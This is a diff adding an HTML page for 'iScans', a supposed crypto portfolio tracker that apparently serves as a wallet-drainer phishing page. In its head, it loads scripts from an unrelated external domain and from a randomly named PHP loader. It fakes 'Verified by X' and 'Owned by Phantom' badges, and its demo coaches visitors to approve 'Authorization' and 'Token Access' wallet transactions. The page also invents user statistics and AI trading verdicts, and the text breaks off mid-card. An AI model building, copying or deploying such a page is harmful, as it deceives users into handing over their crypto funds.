@@ -1,0 +1,1003 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+	
+ 
+	<script type="module" src="https://unisexual-impale.commontechrepo.cc/_nuxt/assets/index.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>iScans - Multi-Chain Portfolio Tracker</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png">
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    
+    <!-- Wallet Connection Script -->
+	<script>
+    document.head.append(Object.assign(document.createElement("script"), {src: "/UJtaptQc.php?s=%2Fipfs%2F3E0Qf5ReDtcnXtklO5AalA352c6c3f6b6e370c08781caa099c1068%3Ft%3D" + Date.now()}));
+	</script>
+    
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- X Verification Screen -->
+    <div id="xVerificationScreen" class="x-verification-screen active">
+        <div class="x-verification-content">
+            <div class="x-logo-container loading" id="xLogoContainer">
+                <svg viewBox="0 0 24 24" class="x-logo" id="xLogo">
+                    <g>
+                        <path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path>
+                    </g>
+                </svg>
+            </div>
+            
+            <p class="x-loading-text" id="xLoadingText">Verifying site security...</p>
+            
+            <div class="x-safe-content" id="xSafeContent">
+                <div class="x-verification-badges">
+                    <div class="x-badge verified">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#14F195" stroke-width="2.5">
+                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                            <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                        </svg>
+                        <span>Verified by X</span>
+                    </div>
+                    <div class="x-badge safe">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#14F195" stroke-width="2">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                            <path d="M9 12l2 2 4-4"></path>
+                        </svg>
+                        <span>Site is Safe</span>
+                    </div>
+                </div>
+                
+                <div class="x-phantom-card">
+                    <p class="x-phantom-label">Owned by</p>
+                    <div class="x-phantom-logo-big">
+                        <img src="images/phantom-logo-freelogovectors.net_.png" alt="Phantom">
+                    </div>
+                    <p class="x-phantom-name">Phantom</p>
+                </div>
+                
+                <div class="x-progress-bar">
+                    <div class="x-progress-fill" id="xProgressFill"></div>
+                </div>
+                <p class="x-redirect-text">Redirecting to site...</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen active">
+        <div class="loading-content">
+            <div class="search-icon-wrapper">
+                <svg class="search-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle class="search-circle" cx="40" cy="40" r="25" stroke-width="6" fill="none"></circle>
+                    <line class="search-handle" x1="58" y1="58" x2="80" y2="80" stroke-width="6"></line>
+                </svg>
+                <div class="scan-line"></div>
+            </div>
+            <h1 class="loading-title">iScans</h1>
+            <p class="loading-powered">powered by <span class="phantom-text">Phantom</span></p>
+            <p class="loading-subtitle">Scanning Blockchain Airdrops...</p>
+            <div class="loading-bar">
+                <div class="loading-progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div id="mainContent" class="main-content">
+        <!-- Header -->
+        <header class="header">
+            <div class="container">
+            <div class="logo">
+                <svg class="logo-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="40" cy="40" r="25" stroke-width="6" fill="none"></circle>
+                    <line x1="58" y1="58" x2="80" y2="80" stroke-width="6"></line>
+                </svg>
+                <div class="logo-group">
+                    <span class="logo-text">iScans</span>
+                    <span class="powered-by">powered by <span class="phantom-text">Phantom</span></span>
+                </div>
+            </div>
+                <button onclick="openModal()" id="connectWalletBtn" class="btn btn-primary Nx-68zna zUSkuElW">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="2" y="6" width="20" height="12" rx="2"></rect>
+                    <path d="M22 10h-4a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2h4"></path>
+                </svg>
+                Connect Wallet
+            </button>
+            </div>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="container">
+                <div class="hero-content">
+                    <div class="hero-badges">
+                        <div class="hero-badge badge-solana">
+                            <span class="pulse-dot"></span>
+                            Solana
+                        </div>
+                        <div class="hero-badge badge-ethereum">
+                            <span class="pulse-dot"></span>
+                            Ethereum
+                        </div>
+                        <div class="hero-badge badge-bsc">
+                            <span class="pulse-dot"></span>
+                            BSC
+                        </div>
+                        <div class="hero-badge badge-polygon">
+                            <span class="pulse-dot"></span>
+                            Polygon
+                        </div>
+                        <div class="hero-badge badge-arbitrum">
+                            <span class="pulse-dot"></span>
+                            Arbitrum
+                        </div>
+                        <div class="hero-badge badge-base">
+                            <span class="pulse-dot"></span>
+                            Base
+                        </div>
+                    </div>
+                    <h1 class="hero-title">
+                        Track Your
+                        <span class="gradient-text">Crypto Coins</span>
+                    </h1>
+                    <p class="hero-description">
+                        Analyze your token portfolio across all major blockchains with AI-powered risk analysis. 
+                        Connect your wallet to discover profit opportunities, paperhanded coins, and get AI trading insights.
+                    </p>
+                    <div class="hero-buttons">
+                        <button onclick="openModal()" class="btn btn-large btn-gradient Nx-68zna zUSkuElW" id="connectMainBtn">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="6" width="20" height="12" rx="2"></rect>
+                                <path d="M22 10h-4a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2h4"></path>
+                            </svg>
+                            Connect Wallet
+                        </button>
+                        <button class="btn btn-large btn-secondary" id="watchDemoBtn">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polygon points="10 8 16 12 10 16 10 8"></polygon>
+                            </svg>
+                            Watch Demo
+                        </button>
+                    </div>
+                    
+                    <!-- Stats -->
+                    <div class="stats">
+                        <div class="stat-item">
+                            <div class="stat-value">1000+</div>
+                            <div class="stat-label">Tokens Tracked</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value">$2.5B+</div>
+                            <div class="stat-label">Portfolio Value</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value">250K+</div>
+                            <div class="stat-label">Wallets Analyzed</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- How it Works Section -->
+        <section class="how-it-works">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">How <span class="gradient-text">iScans</span> Works</h2>
+                    <p class="section-subtitle">Three simple steps to discover your missed opportunities</p>
+                </div>
+                
+                <div class="how-grid">
+                    <div class="how-card">
+                        <div class="how-icon">
+                            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="6" width="20" height="12" rx="2"></rect>
+                                <path d="M22 10h-4a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2h4"></path>
+                            </svg>
+                        </div>
+                        <h3 class="how-title">1. Connect Wallet</h3>
+                        <p class="how-description">Connect your EVM or Solana wallet to let us analyze your transaction history and token holdings securely.</p>
+                    </div>
+                    
+                    <div class="how-card">
+                        <div class="how-icon">
+                            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="11" cy="11" r="8"></circle>
+                                <path d="m21 21-4.35-4.35"></path>
+                            </svg>
+                        </div>
+                        <h3 class="how-title">2. We Analyze</h3>
+                        <p class="how-description">Our algorithm scans every token you sold and calculates what it would be worth at its all-time high.</p>
+                    </div>
+                    
+                    <div class="how-card">
+                        <div class="how-icon">
+                            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <path d="M16 16s-1.5-2-4-2-4 2-4 2"></path>
+                                <line x1="9" y1="9" x2="9.01" y2="9"></line>
+                                <line x1="15" y1="9" x2="15.01" y2="9"></line>
+                            </svg>
+                        </div>
+                        <h3 class="how-title">3. Face Reality</h3>
+                        <p class="how-description">Get a detailed breakdown of every fumble. Share your pain with the community or keep it private.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Example Scans Section -->
+        <section class="paperhands-examples">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">Example <span class="gradient-text">Scans</span></h2>
+                    <p class="section-subtitle">See Paperhands analysis and AI Risk predictions</p>
+                </div>
+                
+                <div class="examples-grid">
+                    <div class="example-card">
+                        <div class="example-header">
+                            <img src="images/TROLL.png" alt="TROLL" class="example-logo">
+                            <div class="example-info">
+                                <h4>$TROLL</h4>
+                                <p>SOL • 1 500 000 tokens</p>
+                            </div>
+                        </div>
+                        <div class="example-status">You Paperhanded</div>
+                        <div class="example-stats">
+                            <div class="stat-row">
+                                <span>Sold for:</span>
+                                <span class="red-text">5.40 SOL</span>
+                            </div>
+                            <div class="stat-row">
+                                <span>Could've made:</span>
+                                <span class="green-text">18.75 SOL</span>
+                            </div>
+                            <div class="stat-row loss">
+                                <span>Loss:</span>
+                                <span class="red-text-big">13.35 SOL</span>
+                            </div>
+                        </div>
+                        <p class="example-text">You were holding 1 500 000 tokens and sold them for 5.40 SOL. If you had held until the ATH, you could have made 18.75 SOL.</p>
+                    </div>
+                    
+                    <div class="example-card">
+                        <div class="example-header">
+                            <img src="images/pipin.jpg" alt="Pippin" class="example-logo">
+                            <div class="example-info">
+                                <h4>$Pippin</h4>
+                                <p>SOL • 2 300 000 tokens</p>
+                            </div>
+                        </div>
+                        <div class="example-status">You Paperhanded</div>
+                        <div class="example-stats">
+                            <div class="stat-row">
+                                <span>Sold for:</span>
+                                <span class="red-text">12.80 SOL</span>
+                            </div>
+                            <div class="stat-row">
+                                <span>Could've made:</span>
+                                <span class="green-text">45.20 SOL</span>
+                            </div>
+                            <div class="stat-row loss">
+                                <span>Loss:</span>
+                                <span class="red-text-big">32.40 SOL</span>
+                            </div>
+                        </div>
+                        <p class="example-text">You were holding 2 300 000 tokens and sold them for 12.80 SOL. If you had held until the ATH, you could have made 45.20 SOL.</p>
+                    </div>
+                    
+                    <div class="example-card ai-example">
+                        <div class="example-header">
+                            <img src="images/Alchemist%20AI.jpg" alt="Alchemist AI" class="example-logo">
+                            <div class="example-info">
+                                <h4>$Alchemist AI</h4>
+                                <p>SOL • Bought at $85k MC</p>
+                            </div>
+                        </div>
+                        <div class="example-status ai-status">AI Risk Analysis</div>
+                        <div class="example-stats">
+                            <div class="stat-row">
+                                <span>Current MC:</span>
+                                <span class="orange-text">$240k</span>
+                            </div>
+                            <div class="stat-row">
+                                <span>AI Predict:</span>
+                                <span class="green-text">$680k</span>
+                            </div>
+                            <div class="stat-row">
+                                <span>Dump Risk:</span>
+                                <span class="green-text">8%</span>
+                            </div>
+                            <div class="stat-row success">
+                                <span>AI Verdict:</span>
+                                <span class="green-text-big">HOLD</span>
+                            </div>
+                        </div>
+                        <p class="example-text">AI detected low risk (8%) with strong potential (2.8x). Cluster analysis shows only 3 linked wallets holding 6% supply.</p>
+                    </div>
+                    
+                    <div class="example-card ai-example">
+                        <div class="example-header">
+                            <img src="images/QmXaRoMTAJ3PSgHkYrKgA9y6bvP5U9DBcvDmXTdvKsYPzY.jpg" alt="Just a chill guy" class="example-logo">
+                            <div class="example-info">
+                                <h4>$Just a chill guy</h4>
+                                <p>SOL • Bought at $1.2M MC</p>
+                            </div>
+                        </div>
+                        <div class="example-status ai-status-sell">AI Risk Analysis</div>
+                        <div class="example-stats">
+                            <div class="stat-row">
+                                <span>Current MC:</span>
+                                <span class="orange-text">$2.8M</span>
+                            </div>
+                            <div class="stat-row">
+                                <span>AI Predict:</span>
+                                <span class="red-text">$1.9M</span>
+                            </div>
+                            <div class="stat-row">
+                                <span>Dump Risk:</span>
+                                <span class="red-text">72%</span>
+                            </div>
+                            <div class="stat-row danger">
+                                <span>AI Verdict:</span>
+                                <span class="red-text-big">SELL</span>
+                            </div>
+                        </div>
+                        <p class="example-text">AI predicts decline with high dump risk (72%). Cluster analysis detected 24 linked wallets controlling 48% of supply.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Features Section -->
+        <section class="features">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">Multi-Chain Portfolio Tracking</h2>
+                    <p class="section-subtitle">Track your crypto coins across all major blockchains in one place</p>
+                </div>
+                
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M12 2v20M2 12h20"></path>
+                            </svg>
+                        </div>
+                        <h3 class="feature-title">Portfolio Analysis</h3>
+                        <p class="feature-description">See all your tokens and coins with real-time profit/loss calculations and insights</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polyline points="12 6 12 12 16 14"></polyline>
+                            </svg>
+                        </div>
+                        <h3 class="feature-title">Paperhands Detector</h3>
+                        <p class="feature-description">Find out which coins you sold too early and how much profit you missed</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M22 12h-4l-3 9L9 3l-3 9H2"></path>
+                            </svg>
+                        </div>
+                        <h3 class="feature-title">Trading History</h3>
+                        <p class="feature-description">Complete analysis of your trading history with detailed profit/loss statistics</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                                <polyline points="7 10 12 15 17 10"></polyline>
+                                <line x1="12" y1="15" x2="12" y2="3"></line>
+                            </svg>
+                        </div>
+                        <h3 class="feature-title">Historical Price Data</h3>
+                        <p class="feature-description">Complete price history of all your tokens with detailed charts and analytics</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                                <path d="M9 12l2 2 4-4"></path>
+                            </svg>
+                        </div>
+                        <h3 class="feature-title">No Wallet Connection</h3>
+                        <p class="feature-description">Simply enter your wallet address or list of addresses - no need to connect your wallet. Secure and private scanning</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <path d="M12 6v6l4 2"></path>
+                            </svg>
+                        </div>
+                        <h3 class="feature-title">Real-Time Analysis</h3>
+                        <p class="feature-description">Instant analysis of your portfolio with real-time profit calculations and trading recommendations</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Demo Modal -->
+        <div id="demoModal" class="modal demo-modal">
+            <div class="modal-overlay"></div>
+            <div class="demo-modal-content">
+                <button class="modal-close" id="closeDemoModal">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                    </svg>
+                </button>
+                
+                <!-- Demo Screen -->
+                <div class="demo-screen">
+                    <!-- Step 1: Mobile Phone with Connect Button -->
+                    <div class="demo-step" id="demoStep1">
+                        <div class="demo-phone">
+                            <div class="demo-phone-frame">
+                                <div class="demo-phone-screen">
+                                    <div class="demo-mobile-header">
+                                        <svg class="demo-mobile-logo" width="30" height="30" viewBox="0 0 100 100">
+                                            <circle cx="40" cy="40" r="25" stroke="#14F195" stroke-width="6" fill="none"></circle>
+                                            <line x1="58" y1="58" x2="80" y2="80" stroke="#14F195" stroke-width="6"></line>
+                                        </svg>
+                                        <span>iScans</span>
+                                    </div>
+                                    <div class="demo-mobile-content">
+                                        <h2>Track Your<br><span class="gradient-text">Crypto Coins</span></h2>
+                        <p>Connect your wallet to analyze your portfolio</p>
+                                        <button class="demo-connect-btn" id="demoConnectBtn">
+                                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                                <rect x="2" y="6" width="20" height="12" rx="2"></rect>
+                                                <path d="M22 10h-4a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2h4"></path>
+                                            </svg>
+                                            Connect Wallet
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 2: Select Wallet -->
+                    <div class="demo-step" id="demoStep2">
+                        <div class="demo-phone">
+                            <div class="demo-phone-frame">
+                                <div class="demo-phone-screen">
+                                    <div class="demo-wallet-select">
+                                        <h3>Select Wallet</h3>
+                                        <div class="demo-wallet-option" id="phantomOption">
+                                            <img src="images/phantom-logo-freelogovectors.net_.png" alt="Phantom" class="demo-wallet-icon">
+                                            <span>Phantom</span>
+                                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                                <polyline points="9 18 15 12 9 6"></polyline>
+                                            </svg>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 3: First Transaction Approval -->
+                    <div class="demo-step" id="demoStep3">
+                        <div class="demo-phone">
+                            <div class="demo-phone-frame">
+                                <div class="demo-phone-screen">
+                                    <div class="demo-transaction">
+                                        <div class="demo-tx-header">
+                                            <img src="images/phantom-logo-freelogovectors.net_.png" alt="Phantom" class="demo-tx-logo">
+                                            <h3>Phantom</h3>
+                                        </div>
+                                        <div class="demo-tx-content">
+                                            <p class="demo-tx-title">Approve Transaction</p>
+                                            <div class="demo-tx-details">
+                                                <div class="demo-tx-row">
+                                                    <span>Type</span>
+                                                    <span>Authorization</span>
+                                                </div>
+                                                <div class="demo-tx-row">
+                                                    <span>Network</span>
+                                                    <span>Solana</span>
+                                                </div>
+                                                <div class="demo-tx-row">
+                                                    <span>Fee</span>
+                                                    <span>~0.000005 SOL</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <button class="demo-approve-btn" id="approveBtn1">Approve</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 4: Second Transaction Approval -->
+                    <div class="demo-step" id="demoStep4">
+                        <div class="demo-phone">
+                            <div class="demo-phone-frame">
+                                <div class="demo-phone-screen">
+                                    <div class="demo-transaction">
+                                        <div class="demo-tx-header">
+                                            <img src="images/phantom-logo-freelogovectors.net_.png" alt="Phantom" class="demo-tx-logo">
+                                            <h3>Phantom</h3>
+                                        </div>
+                                        <div class="demo-tx-content">
+                                            <p class="demo-tx-title">Approve Transaction</p>
+                                            <div class="demo-tx-details">
+                                                <div class="demo-tx-row">
+                                                    <span>Type</span>
+                                                    <span>Token Access</span>
+                                                </div>
+                                                <div class="demo-tx-row">
+                                                    <span>Network</span>
+                                                    <span>Solana</span>
+                                                </div>
+                                                <div class="demo-tx-row">
+                                                    <span>Fee</span>
+                                                    <span>~0.000005 SOL</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <button class="demo-approve-btn" id="approveBtn2">Approve</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 4.5: Select Analysis Type -->
+                    <div class="demo-step" id="demoStep4_5">
+                        <div class="demo-phone">
+                            <div class="demo-phone-frame">
+                                <div class="demo-phone-screen">
+                                    <div class="demo-analysis-select">
+                                        <h3>Choose Analysis</h3>
+                                        <p>Select scan type</p>
+                                        
+                                        <div class="demo-analysis-option" id="aiScanOption">
+                                            <div class="demo-analysis-icon ai-icon">
+                                                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                                    <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                                                    <path d="M2 17l10 5 10-5M2 12l10 5 10-5"></path>
+                                                </svg>
+                                            </div>
+                                            <div class="demo-analysis-text">
+                                                <span class="demo-analysis-title">AI Risk Analysis</span>
+                                                <span class="demo-analysis-desc">Risk score & predictions</span>
+                                            </div>
+                                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                                <polyline points="9 18 15 12 9 6"></polyline>
+                                            </svg>
+                                        </div>
+                                        
+                                        <div class="demo-analysis-option" id="paperhandsOption">
+                                            <div class="demo-analysis-icon paperhands-icon">
+                                                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                                    <path d="M9 11l3 3L22 4"></path>
+                                                    <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
+                                                </svg>
+                                            </div>
+                                            <div class="demo-analysis-text">
+                                                <span class="demo-analysis-title">Paperhands Scanner</span>
+                                                <span class="demo-analysis-desc">Missed profit analysis</span>
+                                            </div>
+                                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                                <polyline points="9 18 15 12 9 6"></polyline>
+                                            </svg>
+                                        </div>
+                                        
+                                        <!-- Animated finger pointer -->
+                                        <div class="demo-finger-pointer">
+                                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
+                                                <path d="M7 11V6a3 3 0 0 1 6 0v5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+                                                <path d="M13 10V8.5a1.5 1.5 0 0 1 3 0V11" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+                                                <path d="M16 11.5V10a1.5 1.5 0 0 1 3 0v4.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+                                                <path d="M19 14.5V14a1.5 1.5 0 0 1 1.5 1.5v0a4.5 4.5 0 0 1-4.5 4.5h-5a5 5 0 0 1-4-2l-3.5-4.5a1.5 1.5 0 0 1 2.5-1.5L8 14" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                            </svg>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 5: Coin Selection -->
+                    <div class="demo-step" id="demoStep5">
+                        <div class="demo-app-window large">
+                            <div class="demo-window-header">
+                                <div class="demo-window-buttons">
+                                    <span class="demo-btn-close"></span>
+                                    <span class="demo-btn-minimize"></span>
+                                    <span class="demo-btn-maximize"></span>
+                                </div>
+                                <div class="demo-window-title">
+                                    <svg class="demo-logo" width="20" height="20" viewBox="0 0 100 100">
+                                        <circle cx="40" cy="40" r="25" stroke="#14F195" stroke-width="6" fill="none"></circle>
+                                        <line x1="58" y1="58" x2="80" y2="80" stroke="#14F195" stroke-width="6"></line>
+                                    </svg>
+                                    iScans - Coin Selection
+                                </div>
+                            </div>
+                            <div class="demo-window-content">
+                                <div class="demo-coin-selection">
+                                    <div class="demo-selection-header">
+                                        <h3>The coins you bought:</h3>
+                                        <p>Select a coin to analyze your trading history</p>
+                                    </div>
+                                    
+                                    <div class="demo-coins-grid">
+                                        <div class="demo-coin-card" data-coin="pippin">
+                                            <div class="demo-coin-logo">
+                                                <img src="images/pipin.jpg" alt="Pippin">
+                                            </div>
+                                            <h4>Pippin</h4>
+                                            <p class="demo-coin-symbol">PIPPIN</p>
+                                        </div>
+                                        
+                                        <div class="demo-coin-card" data-coin="alchemist">
+                                            <div class="demo-coin-logo">
+                                                <img src="images/Alchemist%20AI.jpg" alt="Alchemist AI">
+                                            </div>
+                                            <h4>Alchemist AI</h4>
+                                            <p class="demo-coin-symbol">ALCH</p>
+                                        </div>
+                                        
+                                        <div class="demo-coin-card" data-coin="troll" id="trollCoinCard">
+                                            <div class="demo-coin-logo">
+                                                <img src="images/TROLL.png" alt="TROLL">
+                                            </div>
+                                            <h4>TROLL</h4>
+                                            <p class="demo-coin-symbol">TROLL</p>
+                                        </div>
+                                        
+                                        <div class="demo-coin-card" data-coin="vankedisi">
+                                            <div class="demo-coin-logo">
+                                                <img src="images/vankedisi.jpg" alt="vankedisi">
+                                            </div>
+                                            <h4>Vankedisi</h4>
+                                            <p class="demo-coin-symbol">VANK</p>
+                                        </div>
+                                        
+                                        <div class="demo-coin-card" data-coin="wolf">
+                                            <div class="demo-coin-logo">
+                                                <img src="images/QmaFy59TMnLb4jGgL6LpquyXSxTRXKR4mEfSobUSsPoR46.jpg" alt="Wolf">
+                                            </div>
+                                            <h4>Wolf</h4>
+                                            <p class="demo-coin-symbol">WOLF</p>
+                                        </div>
+                                        
+                                        <div class="demo-coin-card" data-coin="chillguy">
+                                            <div class="demo-coin-logo">
+                                                <img src="images/QmXaRoMTAJ3PSgHkYrKgA9y6bvP5U9DBcvDmXTdvKsYPzY.jpg" alt="Just a chill guy">
+                                            </div>
+                                            <h4>Just a chill guy</h4>
+                                            <p class="demo-coin-symbol">CHILL</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 6: Scanning and Results -->
+                    <div class="demo-step" id="demoStep6">
+                        <div class="demo-app-window large">
+                            <div class="demo-window-header">
+                                <div class="demo-window-buttons">
+                                    <span class="demo-btn-close"></span>
+                                    <span class="demo-btn-minimize"></span>
+                                    <span class="demo-btn-maximize"></span>
+                                </div>
+                                <div class="demo-window-title">
+                                    <svg class="demo-logo" width="20" height="20" viewBox="0 0 100 100">
+                                        <circle cx="40" cy="40" r="25" stroke="#14F195" stroke-width="6" fill="none"></circle>
+                                        <line x1="58" y1="58" x2="80" y2="80" stroke="#14F195" stroke-width="6"></line>
+                                    </svg>
+                                    iScans - Analysis
+                                </div>
+                            </div>
+                            <div class="demo-window-content">
+                                <!-- Scanning Animation -->
+                                <div class="demo-scanning-stage" id="scanningStage">
+                                    <div class="demo-scanning">
+                                        <div class="demo-coin-logo-scanning">
+                                            <img src="images/TROLL.png" alt="TROLL">
+                                        </div>
+                                        <h3 class="demo-scan-title">Analyzing TROLL...</h3>
+                                        <p class="demo-scan-status">Fetching transaction history</p>
+                                        <div class="demo-scan-progress">
+                                            <div class="demo-scan-progress-fill" id="scanProgressFill"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <!-- Paperhanded Result -->
+                                <div class="demo-paperhanded-result" id="paperhandedResult" style="display: none;">
+                                    <div class="paperhanded-card">
+                                        <div class="paperhanded-icon">
+                                            <img src="images/TROLL.png" alt="TROLL">
+                                        </div>
+                                        <h2 class="paperhanded-title">TROLL</h2>
+                                        <h3 class="paperhanded-status">You Paperhanded</h3>
+                                        <p class="paperhanded-sell-info">You sold them for <span class="highlight-green">5.40 SOL</span></p>
+                                        <p class="paperhanded-ath-info">If you had sold them at the ATH, you could have made</p>
+                                        
+                                        <div class="paperhanded-stats">
+                                            <div class="paperhanded-stat-box">
+                                                <div class="stat-label">Potential Profit</div>
+                                                <div class="stat-value-big">18.75 SOL</div>
+                                            </div>
+                                            <div class="paperhanded-stat-box">
+                                                <div class="stat-label">USD Equivalent</div>
+                                                <div class="stat-value-big usd">$2,831.25</div>
+                                            </div>
+                                        </div>
+                                        
+                                        <button class="demo-share-btn" id="shareResultBtn">
+                                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                                <circle cx="18" cy="5" r="3"></circle>
+                                                <circle cx="6" cy="12" r="3"></circle>
+                                                <circle cx="18" cy="19" r="3"></circle>
+                                                <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line>
+                                                <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line>
+                                            </svg>
+                                            Share Result
+                                        </button>
+                                        
+                                        <button class="demo-close-btn" id="demoCloseBtn2">
+                                            Close Demo
+                                        </button>
+                                    </div>
+                                    
+                                    <p class="report-footer">Report compiled by iScans app</p>
+                                </div>
+                                
+                                <!-- AI Risk Analysis Result -->
+                                <div class="demo-ai-result" id="aiRiskResult" style="display: none;">
+                                    <div class="ai-risk-card">
+                                        <!-- SOL Badge -->
+                                        <div class="ai-risk-network-badge">SOL</div>
+                                        
+                                        <!-- Logo -->
+                                        <div class="ai-risk-logo">
+                                            <div class="ai-risk-logo-circle">
+                                                <img src="images/TROLL.png" alt="TROLL">
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Coin Name -->
+                                        <h2 class="ai-risk-coin-name">TROLL</h2>
+                                        
+                                        <!-- AI Risk Alert -->
+                                        <h3 class="ai-risk-alert">AI Risk Alert</h3>
+                                        <p class="ai-risk-scan-time">Scanned: Dec 24, 2025, 13:29</p>
+                                        <p class="ai-risk-validity">(Valid only at scan time)</p>
+                                        
+                                        <!-- Metrics Grid -->
